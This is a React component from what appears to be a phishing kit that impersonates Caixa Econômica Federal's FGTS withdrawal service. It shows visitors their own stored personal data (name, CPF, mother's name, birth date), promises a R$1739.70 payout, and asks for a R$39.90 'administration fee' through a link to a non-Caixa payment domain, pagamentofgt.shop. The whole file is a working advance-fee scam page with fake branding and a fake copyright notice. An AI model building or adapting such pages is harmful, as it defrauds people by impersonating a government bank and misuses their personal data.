import { useEffect, useState } from "react";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import pix from "../assets/pix.png";
import { UserData } from "../types/userData";
import logocaixa from "../assets/caixalogo.png";
import { FaAngleRight } from "react-icons/fa";
import dayjs from "dayjs";

export function PagamentoTarifa() {
  const [, setDisplayedAmount] = useState(0);
  const saqueTotal = 1739.7;
  const [userData, setUserData] = useState<UserData>({
    nome: "",
    cpf: "",
    dataNascimento: "",
    email: "",
    cep: "",
    cidade: "",
    estado: "",
    nomeMae: "",
    rua: "",
    numero: "",
  });

  useEffect(() => {
    const storedUserData = localStorage.getItem("userData");
    if (storedUserData) {
      setUserData(JSON.parse(storedUserData));
    }
  }, []);

  useEffect(() => {
    const interval = setInterval(() => {
      setDisplayedAmount((prev) => (prev < saqueTotal ? prev + 50 : saqueTotal));
    }, 50);
    return () => clearInterval(interval);
  }, [saqueTotal]);

  return (
    <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">
      <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab]">
        <div className="flex items-center justify-between w-full">
          <div className="flex items-center space-x-3">
            <img width={34} src={logo} alt="Logo Caixa" />
            <span className="text-white font-extralight">
              Olá, {userData?.nome.split(" ")[0]}
            </span>
          </div>
          <img src={logofgts} alt="Logo FGTS" width={65} />
        </div>
      </header>

      <main className="flex flex-col items-center justify-center text-center mb-6 px-4 py-6 space-y-6">
        <h1 className="text-4xl font-bold text-gray-800">
          TAXA DE SAQUE
        </h1>
        <h3 className="text-2xl text-zinc-500">
          Basta pagar a taxa de administração Caixa que seu dinheiro cairá em até 3 minutos.
        </h3>

        <div className="w-full max-w-xl text-left bg-white rounded-lg shadow p-4 space-y-3">
          <div className="flex justify-between items-center text-lg font-semibold border-b pb-2">
            <span>Nome:</span>
            <span>{userData.nome.toUpperCase()}</span>
          </div>
          {userData?.nomeMae && (
            <div className="flex justify-between text-gray-700 border-b pb-2">
              <span>Nome da mãe:</span>
              <span>{userData.nomeMae}</span>
            </div>
          )}
          <div className="flex justify-between text-gray-700 border-b pb-2">
            <span>CPF:</span>
            <span>{userData.cpf}</span>
          </div>
          <div className="flex justify-between text-gray-700 border-b pb-2">
            <span>Nascimento:</span>
            <span>{dayjs(userData.dataNascimento).format("DD/MM/YYYY")}</span>
          </div>
          <div className="flex justify-between text-xl font-bold text-blue-700">
            <span>Valor disponível:</span>
            <span>R$ {saqueTotal.toFixed(2)}</span>
          </div>
        </div>

        <div className="text-center space-y-2">
          <div className="flex flex-col items-center justify-center">
            <div className="bg-primary p-3 w-fit rounded-full">
              <img src={logocaixa} width={38} alt="Logo Caixa" />
            </div>
            <p className="text-2xl mb-1 text-primary font-medium">
              Taxa de administração
            </p>
            <p className="text-5xl font-semibold text-primary">R$39,90</p>
          </div>
        </div>

        <div className="flex flex-col items-center space-y-4">
          <img src={pix} alt="Logo Pix" className="w-24 mb-4" />
        </div>

        <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full max-w-xl">
          <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce text-2xl">
            PAGAR TAXA E SACAR MEU FGTS
          </button>
        </a>
      </main>

      <footer className="bg-white text-gray-300 py-6 w-full">
        <div className="container mx-auto flex flex-col md:flex-row justify-between items-center">
          <div className="text-sm">
            <p>&copy; {new Date().getFullYear()} Caixa Econômica. Todos os direitos reservados.</p>
          </div>
          <div className="flex space-x-4 mt-4 md:mt-0">
            <a href="#" className="hover:text-gray-600 text-sm">Política de Privacidade</a>
            <a href="#" className="hover:text-gray-600 text-sm">Termos de Uso</a>
            <a href="#" className="hover:text-gray-600 text-sm">Contato</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
